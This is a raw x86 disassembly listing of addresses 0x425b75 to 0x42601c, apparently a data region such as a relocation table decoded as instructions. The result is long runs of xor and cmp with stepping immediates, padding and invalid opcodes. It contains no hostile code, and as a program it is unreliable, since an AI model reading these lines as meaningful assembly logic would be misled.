  425b75:	cmp    BYTE PTR [edx-0x54c489c8],dh
  425b7b:	cmp    al,0xb3
  425b7d:	cmp    al,0xb9
  425b7f:	cmp    al,0xbd
  425b81:	cmp    al,0xcf
  425b83:	cmp    al,0xdf
  425b85:	cmp    al,0xea
  425b87:	cmp    al,0xee
  425b89:	cmp    al,0xf5
  425b8b:	cmp    al,0xfc
  425b8d:	cmp    al,0x6
  425b8f:	cmp    eax,0x3d2d3d13
  425b94:	xor    edi,DWORD PTR ds:0x3d493d42
  425b9a:	dec    edi
  425b9b:	cmp    eax,0x3d613d56
  425ba0:	lahf   
  425ba1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ba3:	ds loope 0x425be5
  425ba6:	jmp    0x425be7
  425ba8:	clc    
  425ba9:	aas    
  425baa:	add    BYTE PTR [eax+0x0],ah
  425bad:	add    BYTE PTR [eax+0x0],bh
  425bb0:	add    BYTE PTR [eax],al
  425bb2:	add    al,0x30
  425bb4:	or     dh,BYTE PTR [eax]
  425bb6:	adc    dh,BYTE PTR [eax]
  425bb8:	sbb    BYTE PTR [eax],dh
  425bba:	xor    DWORD PTR [eax],esi
  425bbc:	inc    edx
  425bbd:	xor    BYTE PTR [edi+0x30],cl
  425bc0:	pusha  
  425bc1:	xor    BYTE PTR [esi+0x30],ah
  425bc4:	ins    BYTE PTR es:[edi],dx
  425bc5:	xor    BYTE PTR [ecx+0x30],bh
  425bc8:	mov    dh,BYTE PTR [eax]
  425bca:	lahf   
  425bcb:	xor    BYTE PTR [edx-0x32cf41d0],dh
  425bd1:	xor    dl,ah
  425bd3:	xor    bh,ch
  425bd5:	xor    ah,bh
  425bd7:	xor    BYTE PTR [edi],al
  425bd9:	xor    DWORD PTR [ebx],ecx
  425bdb:	xor    DWORD PTR [ebx],edx
  425bdd:	xor    DWORD PTR [edi],edx
  425bdf:	xor    DWORD PTR [ebx],esp
  425be1:	xor    DWORD PTR [edi],ebp
  425be3:	xor    DWORD PTR [ebx],esi
  425be5:	xor    DWORD PTR [edx],edi
  425be7:	xor    DWORD PTR [ebx+0x31],eax
  425bea:	dec    ecx
  425beb:	xor    DWORD PTR [edi+0x31],ecx
  425bee:	pusha  
  425bef:	xor    DWORD PTR [ecx+esi*1+0x72],ebp
  425bf3:	xor    DWORD PTR [ecx-0x72ce78cf],eax
  425bf9:	xor    DWORD PTR [ebx-0x55ce5ecf],ebx
  425bff:	xor    DWORD PTR [ecx+esi*1+0x32ee31b8],esi
  425c06:	repnz xor bh,cl
  425c09:	xor    bh,ch
  425c0b:	xor    al,BYTE PTR [esi]
  425c0d:	xor    ecx,DWORD PTR [edx]
  425c0f:	xor    edi,DWORD PTR [eax+0x35]
  425c12:	jl     0x425c49
  425c14:	dec    edx
  425c15:	cmp    eax,0x3e883d54
  425c1a:	nop
  425c1b:	ds cwde 
  425c1d:	fstp   TBYTE PTR ds:[edi]
  425c20:	add    BYTE PTR [eax],al
  425c22:	add    BYTE PTR [eax+0x0],dh
  425c25:	add    BYTE PTR [eax+eax*1+0x0],ch
  425c29:	add    BYTE PTR ds:0x7d327331,ch
  425c2f:	xor    al,BYTE PTR [edx+esi*1+0x3296328a]
  425c36:	pushf  
  425c37:	xor    ah,BYTE PTR [edx-0x42cd50ce]
  425c3d:	xor    cl,dl
  425c3f:	xor    al,BYTE PTR [ebp+esi*1+0x5d]
  425c43:	xor    eax,0x3589356a
  425c48:	xchg   ebp,eax
  425c49:	xor    eax,0x35a2359c
  425c4e:	scas   al,BYTE PTR es:[edi]
  425c4f:	xor    eax,0x35ba35b4
  425c54:	int3   
  425c55:	xor    eax,0x370f35d0
  425c5a:	sbb    esi,DWORD PTR [edi]
  425c5c:	daa    
  425c5d:	aaa    
  425c5e:	sub    esi,DWORD PTR [edi]
  425c60:	xor    esi,DWORD PTR [edi]
  425c62:	jbe    0x425c9c
  425c64:	xchg   BYTE PTR [eax],bh
  425c66:	cwde   
  425c67:	cmp    BYTE PTR [esi-0x4ac754c8],bl
  425c6d:	cmp    BYTE PTR [eax+edi*1+0x38d638c2],bh
  425c74:	in     al,dx
  425c75:	cmp    dl,dh
  425c77:	cmp    BYTE PTR [edi],al
  425c79:	cmp    DWORD PTR [ecx+edi*1],ecx
  425c7c:	push   ecx
  425c7d:	cmp    bl,BYTE PTR [ebx+0x3a]
  425c80:	push   0x813a7b3a
  425c85:	cmp    cl,BYTE PTR [esi-0x62c56ac6]
  425c8b:	cmp    ah,BYTE PTR [edx+edi*1+0x8000]
  425c92:	sbb    BYTE PTR [edx],al
  425c94:	add    BYTE PTR [eax],al
  425c96:	mov    dh,0x30
  425c98:	mov    esp,0xcb30c230
  425c9d:	xor    dl,dl
  425c9f:	xor    ah,ch
  425ca1:	xor    al,bh
  425ca3:	xor    BYTE PTR [edx],al
  425ca5:	xor    DWORD PTR [ecx],ecx
  425ca7:	xor    DWORD PTR [edi],ecx
  425ca9:	xor    DWORD PTR [ebx],ebx
  425cab:	xor    DWORD PTR [ecx],esp
  425cad:	xor    DWORD PTR [edi],esp
  425caf:	xor    esp,ebp
  425cb1:	xor    esi,edi
  425cb3:	xor    DWORD PTR [eax],ecx
  425cb5:	xor    dl,BYTE PTR ds:0x2b322532
  425cbb:	xor    bh,BYTE PTR [eax]
  425cbd:	xor    bh,BYTE PTR [edi]
  425cbf:	xor    al,BYTE PTR [ebp+0x32]
  425cc2:	dec    esp
  425cc3:	xor    bl,BYTE PTR [esi+0x33]
  425cc6:	xor    ebp,DWORD PTR fs:[esi+0x33]
  425cca:	je     0x425cff
  425ccc:	js     0x425d01
  425cce:	xor    BYTE PTR [ebx],0x90
  425cd1:	xor    edx,DWORD PTR [ebx+esi*1+0x33a533a1]
  425cd8:	lods   al,BYTE PTR ds:[esi]
  425cd9:	xor    edi,DWORD PTR [ebx-0x37cc3dcd]
  425cdf:	xor    edx,ebp
  425ce1:	xor    esp,edi
  425ce3:	xor    ebp,ebp
  425ce5:	xor    edi,edx
  425ce7:	xor    eax,DWORD PTR [ecx]
  425ce9:	xor    al,0xc
  425ceb:	xor    al,0x1b
  425ced:	xor    al,0x25
  425cef:	xor    al,0x2a
  425cf1:	xor    al,0x30
  425cf3:	xor    al,0x36
  425cf5:	xor    al,0x48
  425cf7:	xor    al,0x57
  425cf9:	xor    al,0x66
  425cfb:	xor    al,0x75
  425cfd:	xor    al,0x84
  425cff:	xor    al,0x88
  425d01:	xor    al,0x98
  425d03:	xor    al,0xc7
  425d05:	xor    al,0xd0
  425d07:	xor    al,0xdc
  425d09:	xor    al,0xe6
  425d0b:	xor    al,0xf3
  425d0d:	xor    al,0x5
  425d0f:	xor    eax,0x3517350b
  425d14:	sbb    eax,0x2b352535
  425d19:	xor    eax,0x353b3536
  425d1e:	inc    ecx
  425d1f:	xor    eax,0x35573550
  425d24:	pop    ebp
  425d25:	xor    eax,0x3586356a
  425d2a:	xchg   edx,eax
  425d2b:	xor    eax,0x359e3598
  425d30:	scas   al,BYTE PTR es:[edi]
  425d31:	xor    eax,0x35c735bb
  425d36:	into   
  425d37:	xor    eax,0x35e735d4
  425d3c:	in     eax,dx
  425d3d:	xor    eax,0x360035f3
  425d42:	or     al,0x36
  425d44:	adc    esi,DWORD PTR [esi]
  425d46:	sbb    DWORD PTR [esi],esi
  425d48:	sub    esi,DWORD PTR [esi]
  425d4a:	xor    DWORD PTR [esi],esi
  425d4c:	ds ss inc ebp
  425d4f:	ss dec ebx
  425d51:	ss pop eax
  425d53:	ss fs ss push 0x36
  425d58:	jo     0x425d90
  425d5a:	jnp    0x425d92
  425d5c:	xchg   DWORD PTR [esi],esi
  425d5e:	mov    esi,DWORD PTR [esi]
  425d60:	xchg   edx,eax
  425d61:	ss pushf 
  425d63:	ss test eax,0xcb36c536
  425d69:	fdiv   DWORD PTR ss:[esi]
  425d6c:	fbstp  TBYTE PTR [esi]
  425d6e:	in     eax,0x36
  425d70:	in     al,dx
  425d71:	div    DWORD PTR ss:[esi]
  425d74:	add    DWORD PTR [edi],esi
  425d76:	or     BYTE PTR [edi],dh
  425d78:	push   cs
  425d79:	aaa    
  425d7a:	and    eax,0x38372b37
  425d7f:	aaa    
  425d80:	aas    
  425d81:	aaa    
  425d82:	inc    ebp
  425d83:	aaa    
  425d84:	push   edi
  425d85:	aaa    
  425d86:	pop    ebx
  425d87:	aaa    
  425d88:	data16 aaa 
  425d8a:	imul   esi,DWORD PTR [edi],0x76
  425d8d:	aaa    
  425d8e:	xor    DWORD PTR [edi],0xffffffa7
  425d91:	aaa    
  425d92:	mov    cl,0x37
  425d94:	mov    ebx,0xc837c237
  425d99:	aaa    
  425d9a:	aam    0x37
  425d9c:	out    0x37,eax
  425d9e:	in     eax,dx
  425d9f:	aaa    
  425da0:	stc    
  425da1:	aaa    
  425da2:	or     BYTE PTR [eax],bh
  425da4:	push   cs
  425da5:	cmp    BYTE PTR [eax+edi*1],dl
  425da8:	sbb    DWORD PTR [eax],edi
  425daa:	and    bh,BYTE PTR [eax]
  425dac:	sub    al,0x38
  425dae:	xor    bh,BYTE PTR [eax]
  425db0:	cmp    BYTE PTR ss:[esi],bh
  425db3:	cmp    BYTE PTR [edx+0x38],cl
  425db6:	data16 cmp BYTE PTR [eax+edi*1+0x7c],ch
  425dbb:	cmp    BYTE PTR [edx-0x6cc773c8],al
  425dc1:	cmp    BYTE PTR [ecx-0x48c74ec8],bl
  425dc7:	cmp    ah,al
  425dc9:	cmp    dh,cl
  425dcb:	cmp    bl,bl
  425dcd:	cmp    bl,ch
  425dcf:	cmp    cl,dh
  425dd1:	cmp    BYTE PTR [eax],al
  425dd3:	cmp    DWORD PTR [edi],eax
  425dd5:	cmp    DWORD PTR ds:0x1f391439,ecx
  425ddb:	cmp    DWORD PTR [eax],esi
  425ddd:	cmp    DWORD PTR [edi],esi
  425ddf:	cmp    DWORD PTR ds:0x5a394a39,edi
  425de5:	cmp    DWORD PTR [eax+0x39],esp
  425de8:	outs   dx,DWORD PTR ds:[esi]
  425de9:	cmp    DWORD PTR [esi+0x39],esi
  425dec:	cmp    DWORD PTR [ecx],0x39ab3990
  425df2:	mov    bl,0x39
  425df4:	sar    BYTE PTR [ecx],0xd1
  425df7:	cmp    edi,edx
  425df9:	cmp    ebp,ebx
  425dfb:	cmp    edx,ebp
  425dfd:	cmp    DWORD PTR [ecx],ecx
  425dff:	cmp    cl,BYTE PTR [edi]
  425e01:	cmp    bl,BYTE PTR [ebx]
  425e03:	cmp    ah,BYTE PTR [ecx]
  425e05:	cmp    ch,BYTE PTR [ebx]
  425e07:	cmp    dh,BYTE PTR [ecx]
  425e09:	cmp    al,BYTE PTR [ebx+0x3a]
  425e0c:	dec    ebx
  425e0d:	cmp    dl,BYTE PTR [ebp+0x3a]
  425e10:	bound  edi,QWORD PTR [edx]
  425e12:	jle    0x425e4e
  425e14:	test   BYTE PTR [edx],bh
  425e16:	xchg   ebx,eax
  425e17:	cmp    bl,BYTE PTR [edx-0x56c55dc6]
  425e1d:	cmp    dh,BYTE PTR [edx+edi*1+0x3aca3ac3]
  425e24:	sar    BYTE PTR [edx],1
  425e26:	fnstsw WORD PTR [edx]
  425e28:	out    dx,eax
  425e29:	cmp    bh,bl
  425e2b:	cmp    al,BYTE PTR [ecx]
  425e2d:	cmp    ecx,DWORD PTR [ecx]
  425e2f:	cmp    edi,DWORD PTR [ebx]
  425e31:	cmp    eax,DWORD PTR [ebp+0x3b]
  425e34:	dec    esp
  425e35:	cmp    edx,DWORD PTR [edx+0x3b]
  425e38:	pop    esi
  425e39:	cmp    esp,DWORD PTR [ebx+edi*1+0x6a]
  425e3d:	cmp    esi,DWORD PTR [edi+0x3b]
  425e40:	jle    0x425e7d
  425e42:	test   BYTE PTR [ebx],bh
  425e44:	xchg   ecx,eax
  425e45:	cmp    ebx,DWORD PTR [ecx-0x4ac45dc5]
  425e4b:	cmp    edi,DWORD PTR [ebp-0x26c435c5]
  425e51:	cmp    ebx,edi
  425e53:	cmp    ebp,edi
  425e55:	cmp    edi,ecx
  425e57:	cmp    eax,DWORD PTR [eax]
  425e59:	cmp    al,0x6
  425e5b:	cmp    al,0x21
  425e5d:	cmp    al,0x2c
  425e5f:	cmp    al,0x32
  425e61:	cmp    al,0x38
  425e63:	cmp    al,0x45
  425e65:	cmp    al,0x4c
  425e67:	cmp    al,0x52
  425e69:	cmp    al,0x69
  425e6b:	cmp    al,0x75
  425e6d:	cmp    al,0x86
  425e6f:	cmp    al,0x8c
  425e71:	cmp    al,0x91
  425e73:	cmp    al,0x9d
  425e75:	cmp    al,0xa1
  425e77:	cmp    al,0xa9
  425e79:	cmp    al,0xad
  425e7b:	cmp    al,0xb5
  425e7d:	cmp    al,0xcb
  425e7f:	cmp    al,0xd8
  425e81:	cmp    al,0xe0
  425e83:	cmp    al,0xed
  425e85:	cmp    al,0xf3
  425e87:	cmp    al,0x2
  425e89:	cmp    eax,0x3d153d0a
  425e8e:	sbb    DWORD PTR ds:0x3d2d3d23,edi
  425e94:	cmp    bh,BYTE PTR ds:0x3d653d5f
  425e9a:	jno    0x425ed9
  425e9c:	ja     0x425edb
  425e9e:	jg     0x425edd
  425ea0:	test   DWORD PTR ds:0x3d8f,edi
  425ea6:	add    BYTE PTR [eax+0xb00000],dl
  425eac:	add    BYTE PTR [eax],al
  425eae:	cmp    al,0x30
  425eb0:	xchg   ecx,eax
  425eb1:	xor    al,dl
  425eb3:	xor    al,bl
  425eb5:	xor    ch,bl
  425eb7:	xor    BYTE PTR [ebx],cl
  425eb9:	xor    DWORD PTR [ecx+esi*1],ebx
  425ebc:	xor    DWORD PTR es:[esi],ebp
  425ebf:	xor    DWORD PTR [esi],edi
  425ec1:	xor    DWORD PTR [ecx+0x31],ebp
  425ec4:	jne    0x425ef7
  425ec6:	nop
  425ec7:	xor    DWORD PTR [edx+0x2931b531],ebx
  425ecd:	xor    ch,BYTE PTR [esi]
  425ecf:	xor    dh,BYTE PTR [edi+0x32]
  425ed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ed3:	xor    dh,BYTE PTR [eax-0x41cd4bce]
  425ed9:	xor    cl,al
  425edb:	xor    cl,bh
  425edd:	xor    dl,ch
  425edf:	xor    ah,ah
  425ee1:	xor    ch,bh
  425ee3:	xor    dh,ch
  425ee5:	xor    al,BYTE PTR [edx]
  425ee7:	xor    ecx,DWORD PTR [ecx]
  425ee9:	xor    ecx,DWORD PTR [edi]
  425eeb:	xor    ebx,DWORD PTR [ecx-0x4bcb59cc]
  425ef1:	xor    al,0xc0
  425ef3:	xor    al,0xe1
  425ef5:	xor    al,0xeb
  425ef7:	xor    al,0xf2
  425ef9:	xor    al,0xf8
  425efb:	xor    al,0x7
  425efd:	xor    eax,0x3511350c
  425f02:	pop    ss
  425f03:	xor    eax,0x352a351d
  425f08:	ss xor eax,0x354c3545
  425f0e:	push   edx
  425f0f:	xor    eax,0x356b355f
  425f14:	jl     0x425f4b
  425f16:	xchg   ebp,eax
  425f17:	xor    eax,0x35b135a2
  425f1c:	(bad)  
  425f1d:	xor    eax,0x35d835d4
  425f22:	cmp    BYTE PTR [edi],dh
  425f24:	inc    esp
  425f25:	aaa    
  425f26:	push   esp
  425f27:	aaa    
  425f28:	pop    edi
  425f29:	aaa    
  425f2a:	push   0x74376e37
  425f2f:	aaa    
  425f30:	xor    DWORD PTR [edi],0x37933787
  425f36:	cdq    
  425f37:	aaa    
  425f38:	lahf   
  425f39:	aaa    
  425f3a:	xor    bh,BYTE PTR [ebx]
  425f3c:	test   al,0x3c
  425f3e:	lods   al,BYTE PTR ds:[esi]
  425f3f:	cmp    al,0x23
  425f41:	xor    edi,DWORD PTR ds:[esi]
  425f44:	aas    
  425f45:	ds dec esp
  425f47:	ds push esp
  425f49:	ds fs outs dx,BYTE PTR ds:[esi]
  425f4d:	ds jnp 0x425f8e
  425f50:	sahf   
  425f51:	mov    ds:0x3ea93e,eax
  425f57:	rol    BYTE PTR [eax],1
  425f59:	add    BYTE PTR [eax],bl
  425f5b:	add    BYTE PTR [eax],al
  425f5d:	add    BYTE PTR [edi],bl
  425f5f:	cmp    ah,BYTE PTR [ebx]
  425f61:	cmp    ah,BYTE PTR [edi]
  425f63:	cmp    ch,BYTE PTR [ebx]
  425f65:	cmp    ch,BYTE PTR [edi]
  425f67:	cmp    dh,BYTE PTR [ebx]
  425f69:	cmp    dh,BYTE PTR [edi]
  425f6b:	cmp    bh,BYTE PTR [ebx]
  425f6d:	cmp    al,BYTE PTR [eax]
  425f6f:	and    BYTE PTR [edx],al
  425f71:	add    BYTE PTR [eax],bl
  425f73:	add    BYTE PTR [eax],al
  425f75:	add    BYTE PTR [edx],ah
  425f77:	xor    esp,DWORD PTR [esi]
  425f79:	xor    ebp,DWORD PTR [edx]
  425f7b:	xor    ebp,DWORD PTR [esi]
  425f7d:	xor    esi,DWORD PTR [edx]
  425f7f:	xor    esi,DWORD PTR [esi]
  425f81:	xor    edi,DWORD PTR [edx]
  425f83:	xor    edi,DWORD PTR [esi]
  425f85:	xor    eax,DWORD PTR [eax]
  425f87:	push   eax
  425f88:	add    al,0x0
  425f8a:	push   0x18000000
  425f8f:	xor    BYTE PTR [eax+esi*1],bl
  425f92:	and    BYTE PTR [eax],dh
  425f94:	mov    al,ds:0xa831a431
  425f99:	xor    DWORD PTR [ecx+esi*1+0x31b431b0],ebp
  425fa0:	mov    eax,0xc031bc31
  425fa5:	xor    esp,eax
  425fa7:	xor    eax,edx
  425fa9:	xor    esp,edx
  425fab:	xor    eax,ebx
  425fad:	xor    esp,ebx
  425faf:	xor    eax,esp
  425fb1:	xor    esp,esp
  425fb3:	xor    eax,ebp
  425fb5:	xor    esp,ebp
  425fb7:	xor    eax,esi
  425fb9:	xor    esp,esi
  425fbb:	xor    DWORD PTR [eax],eax
  425fbd:	xor    cl,BYTE PTR [edx+esi*1]
  425fc0:	adc    al,0x32
  425fc2:	sub    BYTE PTR [edx],dh
  425fc4:	pop    esp
  425fc5:	xor    ah,BYTE PTR [eax+0x32]
  425fc8:	je     0x425ffc
  425fca:	lods   al,BYTE PTR ds:[esi]
  425fcb:	xor    cl,BYTE PTR [eax+0x33]
  425fce:	sbb    BYTE PTR [eax+eiz*1],dh
  425fd1:	xor    al,0x28
  425fd3:	xor    al,0x2c
  425fd5:	xor    al,0xd4
  425fd7:	xor    al,0xd8
  425fd9:	xor    al,0xdc
  425fdb:	xor    al,0xe0
  425fdd:	xor    al,0xe4
  425fdf:	xor    al,0xe8
  425fe1:	xor    al,0xec
  425fe3:	xor    al,0xf0
  425fe5:	xor    al,0xf4
  425fe7:	xor    al,0xf8
  425fe9:	xor    al,0xfc
  425feb:	xor    al,0x0
  425fed:	add    BYTE PTR [eax],al
  425fef:	add    BYTE PTR [eax+eax*1],0x18
  425ff3:	add    BYTE PTR [eax],al
  425ff5:	add    BYTE PTR [ecx+edi*1+0x39b439b0],ch
  425ffc:	mov    eax,0xc039bc39
  426001:	cmp    esp,eax
  426003:	cmp    eax,ecx
  426005:	cmp    DWORD PTR [eax],eax
  426007:	mov    al,0x4
  426009:	add    BYTE PTR [eax],bl
  42600b:	add    BYTE PTR [eax],al
  42600d:	add    ah,ch
  42600f:	ss lock ss hlt 
  426013:	ss clc 
  426015:	ss cld 
  426017:	add    BYTE PTR ss:[edi],dh
  42601a:	add    al,0x37
  42601c:	or     BYTE PTR [edi],dh
	...
